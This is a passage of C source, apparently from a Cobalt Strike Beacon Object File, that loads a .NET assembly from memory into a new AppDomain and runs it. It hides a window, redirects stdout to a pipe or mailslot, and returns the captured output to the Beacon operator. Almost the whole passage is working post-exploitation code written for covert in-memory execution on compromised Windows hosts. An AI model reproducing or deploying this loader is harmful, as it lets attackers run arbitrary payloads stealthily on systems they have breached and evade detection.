                ShowWindow(wnd, SW_HIDE);
        }
    }

    //Get current stdout handle
    _GetStdHandle GetStdHandle = (_GetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetStdHandle");
    stdOutput = GetStdHandle(((DWORD)-11));

    //Set stdout to our named pipe or mail slot
    _SetStdHandle SetStdHandle = (_SetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "SetStdHandle");
    success = SetStdHandle(((DWORD)-11), ctx.hFile);

    //Create our AppDomain
    hr = ctx.pICorRuntimeHost->lpVtbl->CreateDomain(ctx.pICorRuntimeHost, (LPCWSTR)ctx.wAppDomain, NULL, &ctx.pAppDomainThunk);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create AppDomain");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    hr = ctx.pAppDomainThunk->lpVtbl->QueryInterface(ctx.pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx.pAppDomain);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to query AppDomain interface");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    //Prep SafeArray
    SAFEARRAYBOUND rgsabound[1] = { 0 };
    rgsabound[0].cElements = assemblyByteLen;
    rgsabound[0].lLbound = 0;
    ctx.pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
    if (!ctx.pSafeArray) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create SafeArray");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    void* pvData = NULL;
    hr = OLEAUT32$SafeArrayAccessData(ctx.pSafeArray, &pvData);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to access SafeArray data");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    MSVCRT$memcpy(pvData, assemblyBytes, assemblyByteLen);
    hr = OLEAUT32$SafeArrayUnaccessData(ctx.pSafeArray);

    //Load assembly
    hr = ctx.pAppDomain->lpVtbl->Load_3(ctx.pAppDomain, ctx.pSafeArray, &ctx.pAssembly);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    hr = ctx.pAssembly->lpVtbl->EntryPoint(ctx.pAssembly, &ctx.pMethodInfo);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to find entry point of assembly.\n");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    ZeroMemory(&ctx.retVal, sizeof(VARIANT));
    ZeroMemory(&ctx.obj, sizeof(VARIANT));
    ctx.obj.vt = VT_NULL;

    ctx.psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);
    if (!ctx.psaStaticMethodArgs) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create method args array");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole);
        return;
    }

    long idx[1] = { 0 };
    OLEAUT32$SafeArrayPutElement(ctx.psaStaticMethodArgs, idx, &ctx.vtPsa);

    //Invoke our .NET Method
    hr = ctx.pMethodInfo->lpVtbl->Invoke_3(ctx.pMethodInfo, ctx.obj, ctx.psaStaticMethodArgs, &ctx.retVal);

    // Use hybrid reading for mailslots with improved chunking
    BOOL bufferMode = ReadSlotHybrid(ctx.returnData, ctx.returnDataSize, &ctx.mainHandle, &ctx.hEvent);
    ctx.useChunking = !bufferMode;

    // Send output only if not already sent in chunks
    if (!ctx.useChunking) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", ctx.returnData);
    }

    //Revert stdout back to original handles
    SetStdHandle(((DWORD)-11), stdOutput);

    //Cleanup everything
    PerformCleanup(&ctx, frConsole);
}
